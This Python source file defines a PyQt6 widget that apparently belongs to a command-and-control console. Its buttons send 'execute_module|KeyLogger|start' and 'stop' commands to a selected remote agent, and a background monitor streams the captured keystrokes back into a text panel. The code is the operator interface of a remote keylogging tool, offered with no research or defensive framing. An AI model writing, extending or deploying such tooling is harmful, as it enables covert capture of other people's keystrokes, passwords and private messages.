import traceback
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QPlainTextEdit, 
                            QPushButton, QMessageBox)
from PyQt6.QtGui import QFont
from database import AgentRepository
from workers import KeyLoggerOutputMonitor
from utils import FontManager
import utils

class KeyLoggerDisplay(QWidget):
    def __init__(self, agent_repository: AgentRepository):
        super().__init__()
        self.agent_repository = agent_repository
        self.current_agent_id = None
        self.output_monitor = None
        
        # Try to use FontManager, but don't fail if it's not available
        try:
            FontManager().add_relative_font_widget(self, 0)
            self.font_manager = FontManager()
        except:
            self.font_manager = None
            
        self.setup_ui()

    def setup_ui(self):
        layout = QVBoxLayout()

        # Create horizontal layout for buttons
        button_layout = QHBoxLayout()
        
        self.start_btn = QPushButton("Start KeyLogger")
        self.start_btn.clicked.connect(self.send_KeyLogger_start) 
        
        self.stop_btn = QPushButton("Stop KeyLogger")
        self.stop_btn.clicked.connect(self.send_KeyLogger_stop) 
        
        # Add buttons to horizontal layout
        button_layout.addWidget(self.start_btn)
        button_layout.addWidget(self.stop_btn)
        
        # Add button layout to main layout
        layout.addLayout(button_layout)

        self.output_display = QPlainTextEdit()
        self.output_display.setReadOnly(True)
        self.output_display.setPlaceholderText("Waiting for KeyLogger output...")
        
        if self.font_manager:
            self.font_manager.add_relative_font_widget(self.output_display, -2)
        self.output_display.setFont(QFont("Consolas"))
        layout.addWidget(self.output_display)
        self.setLayout(layout)

    def send_KeyLogger_start(self):
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        command = "execute_module|KeyLogger|start"
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def send_KeyLogger_stop(self):
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        command = "execute_module|KeyLogger|stop"
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def set_agent(self, agent_id: str):
        if agent_id == self.current_agent_id:
            return
            
        self.current_agent_id = agent_id
        self.output_display.clear()
        
        if self.output_monitor is not None:
            self.output_monitor.stop()
            self.output_monitor.wait()
        
        from config import ServerConfig
        config = ServerConfig()
        self.output_monitor = KeyLoggerOutputMonitor(agent_id, self.agent_repository, config)
        self.output_monitor.output_received.connect(self.update_output)
        self.output_monitor.start()

    def update_output(self, text: str):
        self.output_display.setPlainText(text)
        self.output_display.verticalScrollBar().setValue(
            self.output_display.verticalScrollBar().maximum()
        )

    def cleanup(self):
        if self.output_monitor is not None:
            self.output_monitor.stop()
            self.output_monitor.wait()